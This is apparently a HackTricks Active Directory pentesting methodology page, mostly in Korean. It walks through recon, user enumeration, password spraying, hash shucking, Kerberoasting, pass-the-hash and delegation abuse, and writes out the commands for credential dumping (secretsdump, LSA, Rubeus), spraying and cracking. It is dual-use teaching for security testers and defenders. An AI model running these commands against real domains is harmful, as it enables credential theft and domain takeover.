# Active Directory 방법론

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 네트워크에서 **네트워크 관리자**가 **domains**, **users**, **objects**를 효율적으로 생성하고 관리할 수 있게 해주는 핵심 기술입니다. 대규모로 확장되도록 설계되어 많은 수의 사용자를 관리 가능한 **groups**와 **subgroups**로 조직하고, 다양한 수준에서 **access rights**를 제어할 수 있습니다.

**Active Directory**의 구조는 세 가지 주요 계층으로 구성됩니다: **domains**, **trees**, 그리고 **forests**. **domain**은 공통 데이터베이스를 공유하는 **users**나 **devices** 같은 객체들의 모음입니다. **trees**는 이러한 도메인들이 공통 구조로 연결된 그룹이며, **forest**는 여러 trees의 집합으로 **trust relationships**를 통해 상호 연결되어 조직 구조의 최상위 계층을 형성합니다. 각 계층에서 특정한 **access** 및 **communication rights**를 지정할 수 있습니다.

**Active Directory**의 주요 개념은 다음과 같습니다:

1. **Directory** – Active Directory 객체에 관한 모든 정보를 저장합니다.
2. **Object** – 디렉터리 내의 엔티티를 나타내며, **users**, **groups**, 또는 **shared folders** 등을 포함합니다.
3. **Domain** – 디렉터리 객체의 컨테이너 역할을 하며, 여러 도메인이 **forest** 내에 공존할 수 있고 각 도메인은 자체 객체 모음을 유지합니다.
4. **Tree** – 공통 루트 도메인을 공유하는 도메인들의 그룹입니다.
5. **Forest** – Active Directory의 조직 구조에서 최고 수준으로, 여러 trees와 그 사이의 **trust relationships**로 구성됩니다.

**Active Directory Domain Services (AD DS)**는 네트워크 내 중앙 집중식 관리 및 통신에 필수적인 여러 서비스를 포함합니다. 이러한 서비스는 다음과 같습니다:

1. **Domain Services** – 데이터를 중앙화하여 저장하고 **users**와 **domains** 간 상호작용(예: **authentication**, **search**)을 관리합니다.
2. **Certificate Services** – 안전한 **digital certificates**의 생성, 배포 및 관리를 감독합니다.
3. **Lightweight Directory Services** – **LDAP protocol**을 통해 디렉터리 기반 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 여러 웹 애플리케이션에 대해 **single-sign-on**을 제공하여 사용자를 한 세션에 인증합니다.
5. **Rights Management** – 저작권 자료의 무단 배포 및 사용을 규제하여 보호를 돕습니다.
6. **DNS Service** – **domain names** 해석에 필수적입니다.

자세한 설명은 다음을 확인하세요: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 치트 시트

빠르게 어떤 명령어로 AD를 열거/악용할 수 있는지 보려면 [https://wadcoms.github.io/](https://wadcoms.github.io)에서 많은 정보를 얻을 수 있습니다.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

만약 AD 환경에 접근은 가능하지만 자격증명/세션이 없다면 다음을 시도할 수 있습니다:

- **Pentest the network:**
- 네트워크를 스캔하고, 머신과 열린 포트를 찾아 **취약점을 악용(exploit vulnerabilities)**하거나 해당 머신에서 **자격증명 추출**을 시도하세요(예: [printers could be very interesting targets](ad-information-in-printers.md)).
- DNS 열거는 도메인 내의 웹 서버, 프린터, shares, vpn, 미디어 등 주요 서버에 대한 정보를 줄 수 있습니다.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 이 작업을 수행하는 방법에 대한 자세한 내용은 일반 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)를 참고하세요.
- **Check for null and Guest access on smb services** (이 방법은 최신 Windows 버전에서는 동작하지 않을 수 있습니다):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB 서버를 열거하는 방법에 대한 더 자세한 가이드는 다음에서 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP를 열거하는 방법에 대한 더 자세한 가이드는 여기에서 확인할 수 있습니다(특히 **anonymous access**에 주의하세요):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder를 사용해 **impersonating services**로 자격증명을 수집하세요(참조: ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)로 호스트에 접근하세요
- **evil-S**로 **fake UPnP services**를 노출하여 자격증명을 수집하세요(참조: ../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 내부 문서, 소셜 미디어, 도메인 내부의 서비스(주로 웹) 및 공개적으로 이용 가능한 자료에서 사용자 이름/이름을 추출하세요.
- 회사 직원의 전체 이름을 찾으면 다양한 AD **username conventions**을 시도해볼 수 있습니다 ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). 가장 일반적인 규칙은: _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3개의 _random letters and 3 random numbers_ (abc123) 등이 있습니다.
- 도구:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute enum**: 잘못된 사용자 이름을 요청하면 서버는 **Kerberos error** 코드 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_로 응답하여 해당 사용자 이름이 유효하지 않음을 판단할 수 있습니다. **유효한 사용자 이름**은 AS-REP 응답의 **TGT**를 유발하거나 사용자가 사전 인증을 수행해야 함을 나타내는 _KRB5KDC_ERR_PREAUTH_REQUIRED_ 오류를 반환합니다.
- **No Authentication against MS-NRPC**: 도메인 컨트롤러의 MS-NRPC (Netlogon) 인터페이스에 대해 auth-level = 1 (No authentication)을 사용합니다. 이 방법은 MS-NRPC 인터페이스를 바인딩한 후 `DsrGetDcNameEx2` 함수를 호출하여 자격증명 없이 사용자나 컴퓨터가 존재하는지 확인합니다. 이러한 유형의 열거를 구현한 도구는 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)입니다. 연구 내용은 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)에서 확인할 수 있습니다.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버 중 하나를 찾았다면 **user enumeration against it**도 수행할 수 있습니다. 예를 들어, [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 사용자 이름 목록은 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 및 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 찾을 수 있습니다.
>
> 그러나, 이전에 수행했어야 할 recon 단계에서 **회사에서 일하는 사람들의 이름**을 확보해야 합니다. 이름과 성으로 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 스크립트를 사용해 잠재적인 유효 사용자 이름을 생성할 수 있습니다.

### Knowing one or several usernames

좋습니다. 이미 유효한 사용자 이름을 알고 있지만 비밀번호는 모르는 경우... 다음을 시도하세요:

- [**ASREPRoast**](asreproast.md): 사용자가 _DONT_REQ_PREAUTH_ 속성을 **가지고 있지 않으면** 해당 사용자에 대해 **AS_REP 메시지**를 요청할 수 있습니다. 이 메시지에는 사용자 비밀번호의 파생값으로 암호화된 일부 데이터가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견한 각 사용자에 대해 가장 **일반적인 비밀번호들**을 시도해보세요. 일부 사용자가 취약한 비밀번호를 사용하고 있을 수 있습니다 (비밀번호 정책을 염두에 두세요!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

네트워크의 일부 프로토콜을 **poisoning**하기 위해 크랙할 수 있는 몇몇 챌린지 **hashes**를 **obtain**할 수 있을지도 모릅니다:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

active directory를 열거하는 데 성공했다면 **더 많은 이메일 주소와 네트워크에 대한 더 나은 이해**를 얻게 됩니다. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 강제하여 AD env에 접근할 수 있을지도 모릅니다.

### NetExec workspace-driven recon & relay posture checks

- AD recon 상태를 에겐지먼트별로 유지하려면 **`nxcdb` workspaces**를 사용하세요: `workspace create <name>`는 프로토콜별 SQLite DB들을 `~/.nxc/workspaces/<name>` 아래에 생성합니다 (smb/mssql/winrm/ldap/etc). `proto smb|mssql|winrm`로 뷰를 전환하고 `creds`로 수집된 비밀을 나열하세요. 작업이 끝나면 민감한 데이터를 수동으로 삭제하세요: `rm -rf ~/.nxc/workspaces/<name>`.
- 신속한 서브넷 탐색을 위해 **`netexec smb <cidr>`**를 사용하면 **domain**, **OS build**, **SMB signing requirements**, 및 **Null Auth** 정보를 확인할 수 있습니다. `(signing:False)`로 표시된 멤버는 **relay-prone**한 반면, DC는 종종 signing을 요구합니다.
- 타깃팅을 쉽게 하기 위해 NetExec 출력에서 바로 **hostnames in /etc/hosts**를 생성하세요:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 서명(signing) 때문에 **SMB relay to the DC is blocked** 경우에도 **LDAP** posture를 계속 점검하라: `netexec ldap <dc>`는 `(signing:None)` / 약한 채널 바인딩을 보여준다. SMB 서명이 필요하지만 LDAP 서명이 비활성화된 DC는 **relay-to-LDAP** 대상으로 여전히 남아 있어 **SPN-less RBCD** 같은 악용에 사용될 수 있다.

### 클라이언트 측 프린터 credential leaks → bulk domain credential validation

- Printer/web UIs는 때때로 **embed masked admin passwords in HTML**. 소스 보기/개발자 도구로 cleartext가 드러날 수 있다(예: `<input value="<password>">`), 이를 통해 Basic-auth로 scan/print repositories에 접근할 수 있다.
- Retrieved print jobs에는 사용자별 비밀번호가 포함된 **plaintext onboarding docs**가 들어있을 수 있다. 테스트할 때 pairings를 일치시켜 유지하라:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM 크리덴셜 훔치기

다른 PC나 공유에 **null or guest user** 계정으로 접근할 수 있다면, SCF 파일과 같은 파일을 **배치**하여 누군가 그 파일에 접근할 경우 당신을 대상으로 한 **NTLM 인증을 유발**시켜 **NTLM challenge**를 훔쳐 크랙할 수 있습니다:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**은 이미 보유한 모든 NT 해시를 NT 해시에서 직접 유도되는 키 재료를 사용하는 다른 느린 포맷들에 대한 후보 비밀번호로 취급합니다. Kerberos RC4 티켓, NetNTLM 챌린지 또는 캐시된 자격증명에서 긴 패스프레이즈를 브루트포스하는 대신, NT 해시를 Hashcat의 NT-candidate 모드에 넣어 비밀번호 재사용 여부를 평문을 알지 못한 채로 검증합니다. 이는 도메인 침해 이후 수천 개의 현재 및 이전 NT 해시를 수집했을 때 특히 강력합니다.

다음 상황에서 shucking을 사용하세요:

- DCSync, SAM/SECURITY 덤프 또는 자격증명 볼트에서 얻은 NT 코퍼스가 있고 다른 도메인/포리스트에서 재사용을 테스트해야 할 때.
- RC4 기반 Kerberos 자료(`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM 응답, 또는 DCC/DCC2 블랍을 캡처했을 때.
- 긴, 크랙 불가능한 패스프레이즈의 재사용을 빠르게 증명하고 즉시 Pass-the-Hash로 피벗하려 할 때.

이 기법은 키가 NT 해시가 아닌 암호화 타입(예: Kerberos etype 17/18 AES)에는 작동하지 않습니다. 도메인이 AES 전용을 강제한다면 일반 패스워드 모드로 돌아가야 합니다.

#### Building an NT hash corpus

- **DCSync/NTDS** – 가능한 최대의 NT 해시(및 이전 값)를 가져오기 위해 history 옵션과 함께 `secretsdump.py`를 사용하세요:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

히스토리 항목은 계정당 최대 24개의 이전 해시를 Microsoft가 저장할 수 있기 때문에 후보 풀을 크게 확장합니다. NTDS 비밀을 수집하는 다른 방법은 다음을 참조하세요:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)는 로컬 SAM/SECURITY 데이터와 캐시된 도메인 로그온(DCC/DCC2)을 추출합니다. 중복을 제거하고 해당 해시들을 같은 `nt_candidates.txt` 목록에 추가하세요.
- **Track metadata** – 해시를 생성한 사용자 이름/도메인을 해시와 함께 기록해 두세요(워드리스트가 헥사만 포함하더라도). Hashcat이 승리한 후보를 출력하면 어떤 주체가 비밀번호를 재사용했는지 즉시 알 수 있습니다.
- 동일 포리스트 또는 신뢰된 포리스트에서 온 후보를 우선하세요; shucking 시 겹칠 가능성이 최대화됩니다.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

노트:

- NT-candidate 입력은 **항상 원시 32-헥사 NT 해시** 여야 합니다. 규칙 엔진을 비활성화하세요(`-r` 금지, 하이브리드 모드 금지) — 맹글링은 후보 키 재료를 손상시킵니다.
- 이 모드들이 본질적으로 더 빠른 것은 아니지만, NTLM 키스페이스(예: M3 Max에서 ~30,000 MH/s)는 Kerberos RC4(약 ~300 MH/s)보다 약 100배 빠릅니다. 선별된 NT 목록을 테스트하는 것은 느린 포맷에서 전체 비밀번호 공간을 탐색하는 것보다 훨씬 저렴합니다.
- 항상 최신 Hashcat 빌드를 사용하세요(`git clone https://github.com/hashcat/hashcat && make install`) — 모드 31500/31600/35300/35400은 최근에 추가되었습니다.
- 현재 AS-REQ Pre-Auth에 대한 NT 모드는 없으며, AES etypes (19600/19700)는 키가 UTF-16LE 패스워드에서 PBKDF2로 유도되므로 평문이 필요합니다(원시 NT 해시로는 불가).

#### Example – Kerberoast RC4 (mode 35300)

1. 낮은 권한 사용자로 타깃 SPN에 대한 RC4 TGS를 캡처하세요(자세한 내용은 Kerberoast 페이지 참조):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT 리스트로 티켓을 shuck 하세요:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat은 각 NT 후보로부터 RC4 키를 유도하고 `$krb5tgs$23$...` 블랍을 검증합니다. 일치하면 서비스 계정이 당신의 기존 NT 해시 중 하나를 사용하고 있다는 것을 확인합니다.

3. 즉시 PtH로 피벗하세요:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

원한다면 나중에 `hashcat -m 1000 <matched_hash> wordlists/`로 평문을 복구할 수 있습니다.

#### Example – Cached credentials (mode 31600)

1. 손상된 워크스테이션에서 캐시된 로그온을 덤프하세요:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 관심있는 도메인 사용자의 DCC2 라인을 `dcc2_highpriv.txt`로 복사하고 shuck 하세요:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 성공적인 매치는 목록에 이미 있는 NT 해시를 확인시켜 주며, 캐시된 사용자가 비밀번호를 재사용 중임을 증명합니다. 이를 바로 PtH에 사용하세요(`nxc smb <dc_ip> -u highpriv -H <hash>`) 또는 빠른 NTLM 모드로 오프라인에서 브루트포스하여 문자열을 복구하세요.

동일한 워크플로우가 NetNTLM 챌린지-응답(`-m 27000/27100`) 및 DCC(`-m 31500`)에도 적용됩니다. 일단 매치가 식별되면 relay, SMB/WMI/WinRM PtH를 시작하거나 오프라인에서 마스크/룰로 NT 해시를 재크랙할 수 있습니다.



## Enumerating Active Directory WITH credentials/session

이 단계에서는 유효한 도메인 계정의 **자격증명이나 세션을 이미 탈취한 상태**여야 합니다. 유효한 자격증명이나 도메인 사용자 셸을 가지고 있다면, 이전에 언급한 옵션들이 다른 사용자를 침해하는 데 여전히 유효한 방법이라는 점을 기억하세요.

인증된 열거를 시작하기 전에 **Kerberos double hop 문제**가 무엇인지 알고 있어야 합니다.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

계정을 탈취했다는 것은 **도메인 전체를 침해하기 위한 큰 진전**입니다. 이제 Active Directory 열거를 시작할 수 있기 때문입니다:

[**ASREPRoast**](asreproast.md)에 관해서는 이제 가능한 모든 취약한 사용자를 찾을 수 있고, [**Password Spraying**](password-spraying.md)에 관해서는 모든 사용자명 리스트를 얻어 침해된 계정의 비밀번호, 빈 비밀번호 및 유망한 새 비밀번호를 시도해볼 수 있습니다.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows에서는 (`net user /domain`, `Get-DomainUser` 또는 `wmic useraccount get name,sid`)와 같이 모든 도메인 사용자명을 얻는 것이 매우 쉽습니다. Linux에서는 `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`를 사용할 수 있습니다.

> 이 Enumeration 섹션이 짧아 보이더라도 이것이 전체에서 가장 중요한 부분입니다. (특히 cmd, powershell, powerview, BloodHound 링크를) 방문하여 도메인을 열거하는 방법을 배우고 편해질 때까지 연습하세요. 평가 중에는 이것이 DA로 가는 길을 찾거나 아무 것도 할 수 없다는 결정을 내리는 핵심 순간이 될 것입니다.

### Kerberoast

Kerberoasting은 서비스에 연결된 사용자 계정으로 사용하는 **TGS 티켓**을 얻고, 그 암호화(사용자 비밀번호 기반)를 오프라인에서 크랙하는 기법입니다.

자세한 내용은 다음을 참조하세요:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

자격증명을 얻은 후에는 어떤 **머신**에 접근 가능한지 확인해보세요. 이를 위해 포트 스캔 결과에 따라 여러 서버에 다양한 프로토콜로 연결을 시도하기 위해 **CrackMapExec**를 사용할 수 있습니다.

### Local Privilege Escalation

정규 도메인 사용자로서 자격증명이나 세션을 탈취했고, 이 사용자로 도메인의 어떤 머신에 **접근**할 수 있다면 로컬에서 권한을 상승시키고 자격증명을 훔치려고 시도해야 합니다. 로컬 관리자 권한으로만 당신은 메모리(LSASS)와 로컬(SAM)에서 다른 사용자의 해시를 덤프할 수 있기 때문입니다.

이 책에는 [**Windows에서의 로컬 권한 상승**](../windows-local-privilege-escalation/index.html)에 대한 전체 페이지와 [**체크리스트**](../checklist-windows-privilege-escalation.md)가 있습니다. 또한 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)를 사용하는 것을 잊지 마세요.

### Current Session Tickets

현재 사용자 세션에서 예기치 않은 리소스에 접근할 수 있는 권한을 주는 **티켓**을 찾는 것은 매우 **희박**하지만, 다음을 확인해볼 수 있습니다:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### 컴퓨터 공유에서 자격 증명 찾기 | SMB Shares

Now that you have some basic credentials you should check if you can **find** any **interesting files being shared inside the AD**. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).

[**이 링크를 따라 사용 가능한 도구에 대해 알아보세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM 자격증명 탈취

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## 특권 자격증명/세션이 있는 상태에서 Active Directory 권한 상승

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**해시를 얻는 다양한 방법에 대해 이 페이지를 읽어보세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
You need to use some **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.\
[**자세한 정보는 이 페이지를 읽어보세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 이 방법은 상당히 **노이즈가 많으며** **LAPS**가 이를 **완화**할 수 있다는 점에 유의하세요.

### MSSQL Abuse & Trusted Links

사용자가 **access MSSQL instances** 권한을 가지고 있다면, MSSQL 호스트에서 (SA로 실행 중인 경우) 호스트에서 **execute commands**를 실행하거나 NetNTLM **hash**를 **steal** 하거나 심지어 **relay attack**을 수행할 수 있습니다.\
또한, 한 MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰(database link)되는 경우도 있습니다. 사용자가 신뢰된 데이터베이스에 대한 권한을 가지고 있다면, **trust relationship을 이용해 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 체인으로 연결될 수 있으며, 결국 사용자가 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수도 있습니다.\
**데이터베이스 간의 링크는 forest trusts를 넘어 동작합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

서드파티 인벤토리 및 배포 툴은 종종 자격증명과 코드 실행으로 이어지는 강력한 경로를 노출합니다. 참조:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

만약 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 속성을 가진 Computer 객체를 찾고, 해당 컴퓨터에 대한 도메인 권한이 있다면 그 컴퓨터에 로그인하는 모든 사용자의 메모리에서 TGT를 덤프할 수 있습니다.\
따라서 **Domain Admin이 해당 컴퓨터에 로그인하면**, 그의 TGT를 덤프하여 [Pass the Ticket](pass-the-ticket.md)를 사용해 그를 가장할 수 있습니다.\
constrained delegation 덕분에 **Print Server를 자동으로 탈취**할 수도 있습니다 (운이 좋으면 그 서버가 DC일 수 있음).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자나 컴퓨터가 "Constrained Delegation"에 허용되어 있다면, 그 사용자/컴퓨터는 **임의의 사용자를 가장하여 특정 컴퓨터의 서비스에 접근할 수 있습니다**.\
그리고 만약 이 사용자/컴퓨터의 **hash를 compromise**하면, 일부 서비스에 접근하기 위해 **임의의 사용자(심지어 domain admins까지도)를 impersonate**할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대해 **WRITE** 권한이 있으면 **elevated privileges**로 코드 실행을 획득할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

침해된 사용자는 특정 도메인 객체에 대해 향후 **lateral movement/privilege escalation**을 가능하게 하는 **흥미로운 권한**을 가질 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

도메인 내에서 **Spool 서비스가 리스닝 중인 것**을 발견하면, 이를 **악용하여 새로운 자격증명을 확보하고 권한을 상승**시킬 수 있습니다.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

